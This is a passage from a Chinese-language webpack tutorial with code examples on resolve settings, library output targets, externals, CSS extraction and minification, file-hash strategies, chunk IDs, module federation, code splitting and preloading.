_startProcessing = (entry) =\u0026gt; { this._processor(entry.item, (e, r) =\u0026gt; { this._handleResult(entry, e, r); }); }; _handleResult = (entry, error, result) =\u0026gt; { const callback = entry.callback; const callbacks = entry.callbacks; entry.state = DONE_STATE; //把条目的状态设置为已经完成 entry.callback = undefined; //把callback entry.callbacks = undefined; entry.result = result; //把结果赋给entry entry.error = error; //把错误对象赋给entry callback(error, result); if (callbacks !== undefined) { for (const callback of callbacks) { callback(error, result); } } this._activeTasks--; if (this._willEnsureProcessing === false) { this._willEnsureProcessing = true; setImmediate(this._ensureProcessing); } }; } module.exports = AsyncQueue; webpack 优化 查找模块时，尽量缩小查找范围\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 module.exports = { resolve:{ extensions:[\u0026#39;.js\u0026#39;,\u0026#39;.jsx\u0026#39;,\u0026#39;.ts\u0026#39;,\u0026#39;.json\u0026#39;], // 配置后，在项目中require或import其他模块时，可以省略文件扩展名 alias:{ @:path.resolve(__dirname,\u0026#39;src\u0026#39;), myLib:\u0026#39;具体的库所在目录\u0026#39; }, modules:[\u0026#39;my_modules\u0026#39;,\u0026#39;node_modules\u0026#39;], // 对于查找第三方库，webpack默认使用nodejs的默认规则，即去node_modules目录中查找，如果自己的库想模拟这个查找路径，就可以在这个字段中配置 mainFields:[\u0026#39;browser\u0026#39;, \u0026#39;module\u0026#39;, \u0026#39;main\u0026#39;], // 默认值，指的是对于引入一个包，查找文件时，依次参考package.json文件中的哪个字段指向的文件 mainFiles:[\u0026#39;index.js\u0026#39;], // 默认值，当目录下没有 package.json 文件时，会默认使用目录下的 index.js 这个文件可以在这里配置 }, // resolveLoader 用于配置解析 loader 时的 resolve 配置,默认的配置 resolveLoader:{ modules: [\u0026#39;node_modules\u0026#39;], extensions: [ \u0026#39;.js\u0026#39;, \u0026#39;.json\u0026#39; ], mainFields: [ \u0026#39;loader\u0026#39;, \u0026#39;main\u0026#39; ], }, module:{ // 可以用于配置哪些模块文件的内容不需要进行解析,不需要解析依赖（即无依赖） 的第三方大型类库等，可以通过这个字段来配置，以提高整体的构建速度 // 一般来说我们拿到模块后要分析里面的依赖的模块import/require // 有些模块我们知道它肯定没有依赖别的模块如jquery lodash,所以可以省这一步 //noParse: /jquery|lodash/, // 正则表达式 // 或者使用函数 noParse(content) { return /jquery|lodash/.test(content) }, }, plugins:[ // IgnorePlugin用于忽略某些特定的模块，让 webpack 不把这些指定的模块打包进去 new webpack.IgnorePlugin({ contextRegExp:/moment$/, // 目标库的正则 匹配引入模块路径的正则表达式 resourceRegExp: /^\\.\\/locale/ // 库中需要忽略文件夹的正则 匹配模块的对应上下文，即所在目录名 }) ] } IgnorePlugin 的典型使用就是用于忽略 moment 这个包的语言库文件，对于自己需要的语言文件，自己自行单独导入到项目中即可。\n1 2 3 import moment from \u0026#34;moment\u0026#34;; import \u0026#34;moment/locale/zh-cn\u0026#34;; // 自行导入 console.log(moment().format(\u0026#34;MMMM Do YYYY, h:mm:ss a\u0026#34;)); 打包耗时分析\n1 2 3 4 5 const SpeedMeasureWebpackPlugin = require(\u0026#34;speed-measure-webpack-plugin\u0026#34;); const smw = new SpeedMeasureWebpackPlugin(); module.exports = smw.wrap({ // ... }); 打包体积分析\n1 2 3 4 const { BundleAnalyzerPlugin } = require(\u0026#34;webpack-bundle-analyzer\u0026#34;); module.exports = { plugins: [new BundleAnalyzerPlugin()], }; webpack 构建库 webpack 的配置文件中的 output 对象中的 library 选项允许将模块导出的内容作为库（library）暴露给外部使用\nlibrary属性用于指定库的名称，可以是一个字符串或者一个对象。如果是一个字符串，则将其作为全局变量暴露给浏览器环境。如果是一个对象，则可以在对象中指定 library 的名称和导出方式等相关选项\nlibraryExport属性用于指定要导出的内容，可以是一个字符串、一个字符串数组或者一个对象。如果是一个字符串，则将该字符串指定的导出内容暴露给外部使用。如果是一个字符串数组，则将数组中指定的导出内容暴露给外部使用。如果是一个对象，则可以在对象中指定要导出的内容和导出方式等相关选项\nlibraryTarget 属性用于指定库的导出方式，可以是以下值之一：\nvar：将库导出为一个变量，该变量在全局作用域下可用 assign：将库导出为一个变量，该变量在全局作用域下可用，但可以被其他库或模块覆盖 this：将库导出为一个变量，该变量在 this 对象下可用 window：将库导出为一个变量，该变量在 window 对象下可用（仅在浏览器环境下有效） global：将库导出为一个变量，该变量在 global 对象下可用（仅在 Node.js 环境下有效） commonjs：将库导出为一个 CommonJS 模块，该模块在 Node.js 环境下可用 commonjs2：将库导出为一个 CommonJS2 模块，该模块在 Node.js 环境下可用 amd：将库导出为一个 AMD 模块，该模块在浏览器环境下可用 umd：将库导出为一个 UMD 模块，该模块既可在浏览器环境下，也可在 Node.js 环境下使用 output librarytarget\n在使用 webpack 编写自己开发的库给别人使用时，需要配置这个字段中的值\n当用 Webpack 去构建一个可以被其他模块导入使用的库时需要用到\noutput.library 配置导出库的名称\noutput.libraryExport 配置要导出的模块中哪些子模块需要被导出。 它只有在 output.libraryTarget 被设置成 commonjs 或者 commonjs2 时使用才有意义\noutput.libraryTarget 配置以何种方式导出库,是字符串的枚举类型，支持以下配置\nlibraryTarget 使用者的引入方式 使用者提供给被使用者的模块的方式 var 只能以 script 标签的形式引入我们的库 只能以全局变量的形式提供这些被依赖的模块 commonjs 只能按照 commonjs 的规范引入我们的库 被依赖模块需要按照 commonjs 规范引入 commonjs2 只能按照 commonjs2 的规范引入我们的库 被依赖模块需要按照 commonjs2 规范引入 amd 只能按 amd 规范引入 被依赖的模块需要按照 amd 规范引入 this window global umd 可以用 script、commonjs、amd 引入 按对应的方式引入 1 2 3 4 5 6 7 8 9 module.exports = { entry: \u0026#34;./src/index.js\u0026#34;, output: { path: path.resolve(\u0026#34;build\u0026#34;), filename: \u0026#34;[name].js\u0026#34;, library: \u0026#34;myTools\u0026#34;, libraryTarget: \u0026#34;var\u0026#34;, }, }; 现代化的 npm 包都会打包输出多种模块化规范的文件\nwebpack 目前不支持打包成 esmodule 格式的库。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 const path = require(\u0026#34;path\u0026#34;); const { merge } = require(\u0026#34;webpack-merge\u0026#34;); const baseConfig = { mode: \u0026#34;development\u0026#34;, devtool: false, entry: \u0026#34;./src/index.js\u0026#34;, externals: [ //nodeExternals() //排除所有的第三方模块，就是把node_modules里的模块全部设置为外部模块 ], output: { //library:\u0026#39;math\u0026#39;, //libraryExport:\u0026#39;add\u0026#39;, clean: true, }, }; module.exports = [ merge(baseConfig, { output: { filename: \u0026#34;[name]-window.js\u0026#34;, libraryTarget: \u0026#34;window\u0026#34;, }, }), merge(baseConfig, { output: { filename: \u0026#34;[name]-commonjs.js\u0026#34;, libraryTarget: \u0026#34;commonjs2\u0026#34;, }, }), merge(baseConfig, { output: { filename: \u0026#34;[name]-umd.js\u0026#34;, libraryTarget: \u0026#34;umd\u0026#34;, }, }), merge(baseConfig, { output: { filename: \u0026#34;[name]-amd.js\u0026#34;, libraryTarget: \u0026#34;amd\u0026#34;, }, }), ]; externals\n一般编写一个库的时候，自己的项目中并不要打包第三方依赖到自己最后打包的文件中，而是在 package.json 中通过同等依赖配置项来进行设置。在用户安装了自己的包之后，直接使用用户项目环境中安装的同等依赖包。\nexternals选项用于指定哪些模块应该被视为外部模块，不应该被打包进输出的 bundle 中 externals 选项可以是一个对象、一个字符串、一个正则表达式或者一个函数 如果是一个字符串，则表示要排除的模块名称 如果是一个正则表达式，则表示要排除的模块名称与该正则表达式匹配的所有模块。 如果是一个函数，则在函数中可以自定义判断哪些模块应该被排除在打包之外，需要返回一个布尔值来表示是否排除该模块 如果是一个对象，该对象的键表示要排除的模块名称，值表示在哪种环境下使用该模块。可以指定commonjs、commonjs2、amd或者root等选项来指定在不同的环境下使用该模块时的名称 如果依赖了很多第三方模块，可以使用 webpack-node-externals 插件即可。\n1 2 3 externals: [ nodeExternals() ], webpack-node-externals是一个 npm 包，它可以帮助排除 Node.js 应用程序中不需要打包的第三方模块。与 webpack 的 externals 选项类似，webpack-node-externals 也可以将指定的模块排除在 webpack 打包之外，从而减小输出的 bundle 体积，提高应用程序的加载速度 nodeExternals函数将返回一个排除所有node_modules中的模块的 externals 对象。这样，所有的node_modules中的模块都将被排除在 webpack 打包之外 提取 CSS 1 npm install mini-css-extract-plugin --save-dev 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 const path = require(\u0026#39;path\u0026#39;); const HtmlWebpackPlugin = require(\u0026#39;html-webpack-plugin\u0026#39;); +const MiniCssExtractPlugin = require(\u0026#39;mini-css-extract-plugin\u0026#39;); module.exports = { mode: \u0026#39;development\u0026#39;, devtool: false, entry: \u0026#39;./src/index.js\u0026#39;, output: { path: path.resolve(__dirname, \u0026#39;dist\u0026#39;), filename: \u0026#39;[name].js\u0026#39;, + publicPath: \u0026#39;/\u0026#39; }, module: { rules: [ + { test: /\\.css$/, use: [MiniCssExtractPlugin.loader, \u0026#39;css-loader\u0026#39;] }, + { test: /\\.less$/, use: [MiniCssExtractPlugin.loader, \u0026#39;css-loader\u0026#39;, \u0026#39;less-loader\u0026#39;] }, + { test: /\\.scss$/, use: [MiniCssExtractPlugin.loader, \u0026#39;css-loader\u0026#39;, \u0026#39;sass-loader\u0026#39;] }, ] }, plugins: [ new HtmlWebpackPlugin({ template: \u0026#39;./src/index.html\u0026#39; }), + new MiniCssExtractPlugin({ + filename: \u0026#39;style/[name].css\u0026#39; + }) ] }; 开发模式下压缩文件 optimize-css-assets-webpack-plugin是一个优化和压缩 CSS 资源的插件 terser-webpack-plugin是一个优化和压缩 JS 资源的插件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 const path = require(\u0026#39;path\u0026#39;); const HtmlWebpackPlugin = require(\u0026#39;html-webpack-plugin\u0026#39;); const MiniCssExtractPlugin = require(\u0026#39;mini-css-extract-plugin\u0026#39;); + const OptimizeCssAssetsWebpackPlugin = require(\u0026#39;optimize-css-assets-webpack-plugin\u0026#39;); + const TerserPlugin = require(\u0026#39;terser-webpack-plugin\u0026#39;); module.exports = { + mode: \u0026#39;none\u0026#39;, // 如果mode是production,会自动启用压缩插件,如果配置为none表示不会启用压缩插件，但可以自己配 devtool: false, entry: \u0026#39;./src/index.js\u0026#39;, + // js文件的压缩 + optimization: { + minimize: true, + minimizer: [ + new TerserPlugin(), + ], + }, output: { path: path.resolve(__dirname, \u0026#39;dist\u0026#39;), filename: \u0026#39;[name].js\u0026#39;, publicPath: \u0026#39;/\u0026#39;, }, devServer: { contentBase: path.resolve(__dirname, \u0026#39;dist\u0026#39;), compress: true, port: 8080, open: true, }, module: { rules: [ { test: /\\.(jpg|png|gif|bmp|svg)$/, type:\u0026#39;asset/resource\u0026#39;, generator:{ filename:\u0026#39;images/[contenthash][ext]\u0026#39; } }, { test: /\\.html$/, loader: \u0026#39;html-loader\u0026#39;, }, ], }, plugins: [ + // html文件压缩 new HtmlWebpackPlugin({ template: \u0026#39;./src/index.html\u0026#39;, + minify: { + collapseWhitespace: true, + removeComments: true } }), new MiniCssExtractPlugin({ filename: \u0026#39;css/[name].css\u0026#39;, }), + new OptimizeCssAssetsWebpackPlugin(), // css文件压缩 ], }; CDN public-path\nexternal-remotes-plugin\nHTML 文件不缓存，放在自己的服务器上，关闭自己服务器的缓存，静态资源的 URL 变成指向 CDN 服务器的地址\n静态的 JavaScript、CSS、图片等文件开启 CDN 和缓存，并且文件名带上 HASH 值\n为了并行加载不阻塞，把不同的静态资源分配到不同的 CDN 服务器上\n可以通过在 HTML HEAD 标签中 加入\u0026lt;link rel=\u0026quot;dns-prefetch\u0026quot; href=\u0026quot;http://img.zhufengpeixun.cn\u0026quot;\u0026gt;去预解析域名，以降低域名解析带来的延迟\n文件指纹 打包后输出的文件名和后缀 hash 一般是结合 CDN 缓存来使用，通过 webpack 构建之后，生成对应文件名自动带上对应的 MD5 值。如果文件内容改变的话，那么对应文件哈希值也会改变，对应的 HTML 引用的 URL 地址也会改变，触发 CDN 服务器从源服务器上拉取对应数据，进而更新本地缓存。 如果 webpack 打包时任何文件都没有变动，则本次打包的 hash 和上一次的 hash 一样 指纹占位符\n占位符名称 含义 ext 资源后缀名 name 文件名称 path 文件的相对路径 folder 文件所在的文件夹 hash 每次 webpack 构建时生成一个唯一的 hash 值 chunkhash 根据 chunk 生成 hash 值，来源于同一个 chunk，则 chunkhash 值就一样 contenthash 根据内容生成 hash 值，文件内容相同 hash 值就相同 hash：每次构建项目生成的唯一 hash 值，所有文件共享同一个 hash 值。只要项目文件有任何改变，整个项目的 hash 值都会改变。因此，如果你使用了 hash 并且只是改变了项目中的一个文件，所有文件都会生成一个新的 hash，这将导致客户端需要重新下载所有文件，即使大部分文件实际上并未改变。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 const path = require(\u0026#34;path\u0026#34;); const glob = require(\u0026#34;glob\u0026#34;); const PurgecssPlugin = require(\u0026#34;purgecss-webpack-plugin\u0026#34;); // 删除多余的css const MiniCssExtractPlugin = require(\u0026#39;mini-css-extract-plugin\u0026#39;); const PATHS = { src: path.join(__dirname, \u0026#39;src\u0026#39;) } module.exports = { mode: \u0026#34;production\u0026#34;, + entry: { + main: \u0026#39;./src/index.js\u0026#39;, + vender:[\u0026#39;lodash\u0026#39;] + }, output:{ path:path.resolve(__dirname,\u0026#39;dist\u0026#39;), + filename:\u0026#39;[name].[hash:8].js\u0026#39; }, module: { rules: [ { test: /\\.css$/, include: path.resolve(__dirname, \u0026#34;src\u0026#34;), exclude: /node_modules/, use: [ { loader: MiniCssExtractPlugin.loader, }, \u0026#34;css-loader\u0026#34;, ], }, ], }, plugins: [ new MiniCssExtractPlugin({ + filename: \u0026#34;[name].[hash:8].css\u0026#34; }), new PurgecssPlugin({ paths: glob.sync(`${PATHS.src}/**/*`, { nodir: true }), }), ], }; chunkhash：它根据不同的入口文件(Entry)或者不同的 chunk 进行依赖文件解析、构建对应的 chunk，生成对应的哈希值。在生产环境里把一些公共库和程序入口文件区分开，单独打包构建，接着采用 chunkhash 的方式生成哈希值，那么只要不改动公共库的代码，就可以保证其哈希值不会受影响。 只有所属 chunk 的内容改变时，hash 值才会改变。这就意味着，如果你在项目中改变了一个文件，只有这个文件所在的 chunk 的 hash 值会改变，其他的 chunk 不会改变。这实际上可以让客户端只下载改变了的文件，而不是所有文件。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 const path = require(\u0026#34;path\u0026#34;); const glob = require(\u0026#34;glob\u0026#34;); const PurgecssPlugin = require(\u0026#34;purgecss-webpack-plugin\u0026#34;); const MiniCssExtractPlugin = require(\u0026#39;mini-css-extract-plugin\u0026#39;); const PATHS = { src: path.join(__dirname, \u0026#39;src\u0026#39;) } module.exports = { mode: \u0026#34;production\u0026#34;, entry: { main: \u0026#39;./src/index.js\u0026#39;, vender:[\u0026#39;lodash\u0026#39;] }, output:{ path:path.resolve(__dirname,\u0026#39;dist\u0026#39;), + filename:\u0026#39;[name].[chunkhash].js\u0026#39; }, plugins: [ new MiniCssExtractPlugin({ + filename: \u0026#34;[name].[chunkhash].css\u0026#34; }) ], }; contenthash：使用 chunkhash 存在一个问题，就是当在一个 JS 文件中引入 CSS 文件，编译后它们的 chunkhash 是相同的，而且只要 js 文件发生改变 ，关联的 css 文件 chunkhash 也会改变，这个时候可以使用mini-css-extract-plugin里的contenthash值，保证即使 css 文件所处的模块里就算其他文件内容改变，只要 css 文件内容不变，那么不会重复构建 1 2 3 4 5 6 7 8 9 10 11 12 13 14 const path = require(\u0026#34;path\u0026#34;); const MiniCssExtractPlugin = require(\u0026#39;mini-css-extract-plugin\u0026#39;); module.exports = { output:{ path:path.resolve(__dirname,\u0026#39;dist\u0026#39;), filename:\u0026#39;[name].[chunkhash].js\u0026#39; }, plugins: [ new MiniCssExtractPlugin({ + filename: \u0026#34;[name].[contenthash].css\u0026#34; }), ], }; 打包后的内容上传到自己的服务器后，CDN 服务器并不会主动请求我们的服务器以更新最新的资源文件，但可以开发一个插件，将打包后的文件自动推送到 CDN 服务器上。\n不同 hash 的特点：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 function createHash() { return require(\u0026#34;crypto\u0026#34;).createHash(\u0026#34;md5\u0026#34;); } // 两个入口文件 let entry = { entry1: \u0026#34;entry1\u0026#34;, entry2: \u0026#34;entry2\u0026#34;, }; // 两个文件内部的具体内容 let entry1 = \u0026#34;requir(\u0026#39;depModule1\u0026#39;)\u0026#34;; //模块entry1 let entry2 = \u0026#34;require(\u0026#39;depModule2\u0026#39;)\u0026#34;; //模块entry2 // 两个入口文件分别依赖的模块文件中的内容 let depModule1 = \u0026#34;depModule1\u0026#34;; //模块depModule1 let depModule2 = \u0026#34;depModule2\u0026#34;; //模块depModule2 //如果都使用hash的话，因为这是工程级别的，即每次修改任何一个文件，所有文件名的hash至都将改变。所以一旦修改了任何一个文件，整个项目的文件缓存都将失效 let hash = createHash() .update(\u0026#34;entry1ID\u0026#34;) // 并不是使用的模块文件中的内容生成hash，而是使用的模块的id名字来生成hash，一旦有文件变化，这个模块ID就会变化 .update(\u0026#34;entry2ID\u0026#34;) .update(\u0026#34;depModule1ID\u0026#34;) .update(\u0026#34;depModule2ID\u0026#34;) .digest(\u0026#34;hex\u0026#34;); console.log(\u0026#34;hash\u0026#34;, hash); //chunkhash根据不同的入口文件(Entry)进行依赖文件解析、构建对应的chunk，生成对应的哈希值。 //在生产环境里把一些公共库和程序入口文件区分开，单独打包构建，接着采用chunkhash的方式生成哈希值，那么只要不改动公共库的代码，就可以保证其哈希值不会受影响 let entry1ChunkHash = createHash() .update(\u0026#34;entry1ID\u0026#34;) .update(\u0026#34;depModule1ID\u0026#34;) .digest(\u0026#34;hex\u0026#34;); console.log(\u0026#34;entry1ChunkHash\u0026#34;, entry1ChunkHash); let entry2ChunkHash = createHash() .update(\u0026#34;entry2ID\u0026#34;) .update(\u0026#34;depModule2ID\u0026#34;) .digest(\u0026#34;hex\u0026#34;); console.log(\u0026#34;entry2ChunkHash\u0026#34;, entry2ChunkHash); let entry1ContentHash = createHash() .update(entry1) .update(depModule1) .digest(\u0026#34;hex\u0026#34;); console.log(\u0026#34;entry1ContentHash\u0026#34;, entry1ContentHash); let entry2File = entry2 + depModule2; let entry2ContentHash = createHash().update(entry2File).digest(\u0026#34;hex\u0026#34;); console.log(\u0026#34;entry2ContentHash\u0026#34;, entry2ContentHash); 自己写的修改 hash 的 plugin：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 class HashPlugin { constructor(options) { this.options = options; } apply(compiler) { compiler.hooks.compilation.tap(\u0026#34;HashPlugin\u0026#34;, (compilation, params) =\u0026gt; { //如果你想改变hash值，可以在hash生成这后修改 compilation.hooks.afterHash.tap(\u0026#34;HashPlugin\u0026#34;, () =\u0026gt; { let fullhash = \u0026#34;fullhash\u0026#34;; //时间戳 console.log(\u0026#34;本次编译的compilation.hash\u0026#34;, compilation.hash); compilation.hash = fullhash; //output.filename [fullhash] for (let chunk of compilation.chunks) { console.log(\u0026#34;chunk.hash\u0026#34;, chunk.hash); chunk.renderedHash = \u0026#34;chunkHash\u0026#34;; //可以改变chunkhash renderedHash就是chunkhash console.log(\u0026#34;chunk.contentHash\u0026#34;, chunk.contentHash); chunk.contentHash = { javascript: \u0026#34;javascriptContentHash\u0026#34;, \u0026#34;css/mini-extract\u0026#34;: \u0026#34;cssContentHash\u0026#34;, }; } }); }); } } module.exports = HashPlugin; /** * 三种hash * 1. hash compilation.hash * 2. chunkHash 每个chunk都会有一个hash * 3. contentHash 内容hash 每个文件会可能有一个hash值 */ moduleIds \u0026amp; chunkIds 的优化 module: 每一个文件(js,css,jpg,字体等)其实都可以看成一个 module chunk: webpack 打包最终的代码块，代码块会生成文件，一个 chunk 对应一个文件，同时每个 entry 入口都会对应一个 chunk，一个 chunk 都会对应的一个文件。但是反之，一个文件并不一定都是根据 entry 来生成的，有可能是 import 动态导入导致代码分割生成的文件 在 webpack5 之前，不是根据 entry 配置打包生成的 chunk 文件（通过 import 方法动态导入的模块），都会以 1、2、3\u0026hellip;的文件命名方式输出，删除某些文件可能会导致缓存失效 在生产模式下，默认启用这些功能 chunkIds: \u0026ldquo;deterministic\u0026rdquo;, moduleIds: \u0026ldquo;deterministic\u0026rdquo;，此算法采用确定性的方式将短数字 ID(3 或 4 个字符)，短 hash 值分配给 modules 和 chunks chunkId 设置为 deterministic，则 output 中 chunkFilename 里的[name]会被替换成确定性短数字 ID 虽然 chunkId 不变(不管值是 deterministic | natural | named)，但更改 chunk 内容，chunkhash 还是会改变的 可选值 含义 示例 natural（默认值）自然数 按使用顺序的数字 ID 1 named 方便调试的高可读性 id src_two_js.js deterministic 根据模块名称生成简短的 hash 值 915 size 根据模块大小生成的数字 id 0 webpack.config.js\n1 2 3 4 5 6 7 8 9 const path = require(\u0026#39;path\u0026#39;); module.exports = { mode: \u0026#39;development\u0026#39;, devtool:false, + optimization:{ + moduleIds:\u0026#39;deterministic\u0026#39;, + chunkIds:\u0026#39;deterministic\u0026#39; + } } src\\index.js\n1 2 3 import(\u0026#34;./one\u0026#34;); import(\u0026#34;./two\u0026#34;); import(\u0026#34;./three\u0026#34;); one.js\n1 export default \u0026#34;one\u0026#34;; two 和 three 的文件内容和 one 类似。\n在 webpack 的配置文件中：\n1 2 3 4 + optimization:{ + moduleIds:\u0026#39;natural\u0026#39;, + chunkIds:\u0026#39;natural\u0026#39; + } 打包后生成的文件的名字如下（以前默认就是 natural）：\n采用 natural 的缺点：\n如果代码中移除了 two 的依赖，那么原来的 three 就会变成新的 2，如果在没有采用 hash 或者 chunkhash 等的情况下，会导致文件的缓存失效。\n在 webpack 的配置文件中：\n1 2 3 4 + optimization:{ + moduleIds:\u0026#39;deterministic\u0026#39;, + chunkIds:\u0026#39;deterministic\u0026#39; + } 打包后生成的文件的名字如下（现在默认就是 deterministic）：\n那么在这种情况下，如果源码中再次移除 two，这时，打包后的结果，one 和 three 对应仍然是原来的文件名而没有改变。\n这样就能长期缓存。\n如果想把动态加载的多个模块根据需要合并为一个文件，那就需要借助 splitChunksPlugin 配置来实现。\n实现微前端的方式：\niframe qiankun 模块联邦 模块联邦 一般用于实现微前端。 典型的产品：qiankun。\nModule Federation 的动机是为了不同开发小组间共同开发一个或者多个应用\n应用将被划分为更小的应用块，一个应用块，可以是比如头部导航或者侧边栏的前端组件，也可以是数据获取逻辑的逻辑组件\n每个应用块由不同的组开发\n应用或应用块共享其他其他应用块或者库\n使用 Module Federation 时，每个应用块都是一个独立的构建，有自己的打包配置，这些构建都将编译为容器\n容器可以被其他应用或者其他容器应用\n一个被引用的容器被称为 remote，引用者被称为 host ， remote 暴露模块给 host，host 则可以使用这些暴露的模块，这些模块被成为 remote 模块\n模块联邦必须异步导入（ import(\u0026lsquo;xxxx.js\u0026rsquo;) ）。\n使用了模块联邦后的项目，不同的容器项目可以选择不同的技术栈，但是可能比较难进行不同应用块之间的组件间通信，但是必须都依赖于 webpack5。\n字段 类型 含义 name string 必传值，即输出的模块名，被远程引用时路径为${name}/${expose} library object 声明全局变量的方式，name 为 umd 的 name filename string 构建输出的文件名 remotes object 远程引用的应用名及其别名的映射，使用时以 key 值作为 name exposes object 被远程引用时可暴露的资源路径及其别名 shared object 与其他应用之间可以共享的第三方依赖，使你的代码中不用重复加载同一份依赖 代码分割 方式一 通过配置 entry 为多个入口实现代码分割，每个入口和它的依赖都会生成一个代码块而生成单独的文件\n这种方式的不足：\n不够灵活，一个入口对应一个代码块，对应一个文件，不能将核心的应用程序进行拆分 如果入口 chunks 之间包含重复的模块(如：lodash)，那些重复模块都会被引入到各自生成的文件中 1 2 3 4 5 6 { entry: { entry1: \u0026#34;./src/entry1.js\u0026#34;, entry2: \u0026#34;./src/entry2.js\u0026#34;, }, } entry1.js 和 entry.js 代码：\n1 2 const title = require(\u0026#34;./title\u0026#34;); console.log(title); title.js:\n1 module.exports = \u0026#34;title\u0026#34;; 打包生成两个文件 entry1.js 和 entry2.js，它们内部都有以下代码段：\n1 2 3 4 5 var webpackModules = { \u0026#34;./src/title.js\u0026#34;: (module) =\u0026gt; { module.exports = \u0026#34;title\u0026#34;; }, }; html 中：\n1 2 \u0026lt;script defer src=\u0026#34;entry1.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script defer src=\u0026#34;entry2.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 方式二 动态导入和懒加载。\nimport()是一个 JS 语法，webpack 在打包编译的时候，如果遇到 import 语法会把它转换成 require.e，require.e 是通过动态创建 script 标签实现的。\n用户当前需要用什么功能就只加载这个功能对应的代码，也就是所谓的按需加载，在给单页应用做按需加载优化时 一般采用以下原则： 对网站功能进行划分，每一类一个 chunk 对于首次打开页面需要的功能直接加载，尽快展示给用户,某些依赖大量代码的功能点可以按需加载 被分割出去的代码需要一个按需加载的时机 webpack.config.js：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 const HtmlWebpackPlugin = require(\u0026#34;html-webpack-plugin\u0026#34;); module.exports = { output: { clean: true, }, mode: \u0026#34;development\u0026#34;, devtool: false, plugins: [ new HtmlWebpackPlugin({ template: \u0026#34;./src/index.html\u0026#34;, }), ], }; video.js，假设这个文件非常大\n1 module.exports = \u0026#34;video\u0026#34;; index.js\n1 2 3 4 5 document.getElementById(\u0026#34;btn\u0026#34;).addEventListener(\u0026#34;click\u0026#34;, function () { import(\u0026#34;./video\u0026#34;).then((result) =\u0026gt; { console.log(result); }); }); index.html\n1 \u0026lt;button id=\u0026#34;play\u0026#34;\u0026gt;播放\u0026lt;/button\u0026gt; 以上面的代码打包后，生成文件放到浏览器中运行时，浏览器先请求 html 文件，html 文件内容有如下代码段：\n1 2 3 4 \u0026lt;script defer src=\u0026#34;main.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;btn\u0026#34;\u0026gt;按钮\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; 这会再去请求 main.js 文件，该文件请求回来后进行执行，给 button 绑定上 click 事件，但是因为没有触发该点击事件，所以不会自动的去加载对应的懒加载文件，当点击后才会发起网络请求并加载对应的文件。\n点击按钮前的网络面板请求面板如下：\n点击按钮后，网络面板如下：\n与方式二相关的 preload 和 prefetch\nimport(/*_ webpackPreload:true _/ \u0026ldquo;./video\u0026rdquo;)中的即使使用了魔法注释也不会生效，必须配置一个插件才行。@vue/preload-webpack-plugin 。\n为什么配置了 webpackPreload:true 没有效果？\n如果想一个 script 脚本设置为 preload，预先拉取，它的优先级是非常高的，它应该和 main.js 并行加载，所以说不可能把插 preload 的 link 标签的操作动作放在 main.js 里面执行，只能把这个工作交给 html-webpack-plugin，动态的向 html 文件里插入链接。\n为了能尽快的加载需要的文件（比如加载完主要文件后，自动去加载一些懒加载文件，不用点击按钮再加载那些懒加载文件），这是就需要使用 prefetch 或者 preload 解决方案了。具体如下：\n1 npm install @vue/preload-webpack-plugin -D 以前的就包名叫： webpackpreload-webpack-plugin。@vue/preload-webpack-plugin 则是新包名。\npreload\npreload 通常用于本页面要用到的关键资源，包括关键 js、字体、css 文件，需要 preload 的资源会在加载到 html 文件后，和其他通过 script 引入的脚本有一样的优先级，并行加载 preload 将会把资源的下载顺序权重提高，使得关键数据提前下载好,优化页面打开速度 在资源上添加预先加载的注释，你指明该模块需要立即被使用 一个资源的加载的优先级被分为五个级别,分别是 Highest 最高 High 高 Medium 中等 Low 低 Lowest 最低 未作 preload 或者 prefetch 处理的异步/延迟/插入的脚本（无论在什么位置）在网络优先级中是 Low link-rel-prefetch-preload-in-webpack Support for webpackPrefetch and webpackPreload preload-webpack-plugin webpackpreload-webpack-plugin ImportPlugin.js webpack.config.js：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 const HtmlWebpackPlugin = require(\u0026#34;html-webpack-plugin\u0026#34;); + const PreloadWebpackPlugin = require(\u0026#34;@vue/preload-webpack-plugin\u0026#34;); module.exports = { output: { clean: true, }, mode: \u0026#34;development\u0026#34;, devtool: false, plugins: [ new HtmlWebpackPlugin({ template: \u0026#34;./src/index.html\u0026#34;, }), + new PreloadWebpackPlugin(), ], }; index.js：\n1 2 3 4 5 document.getElementById(\u0026#34;btn\u0026#34;).addEventListener(\u0026#34;click\u0026#34;, function () { import(\u0026#34;./video\u0026#34;).then((result) =\u0026gt; { console.log(result); }); }); 其他的 video.js，html 模板文件都没变。\n执行打包操作后生成的 html 文件中有如下代码段：\n1 2 3 4 5 6 7 8 \u0026lt;head\u0026gt; \u0026lt;script defer src=\u0026#34;main.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;link href=\u0026#34;src_video_js.js\u0026#34; rel=\u0026#34;preload\u0026#34; as=\u0026#34;script\u0026#34;\u0026gt;\u0026lt;/link\u0026gt; // 多出了这行预加载代码，这就是那个插件的原理 \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div 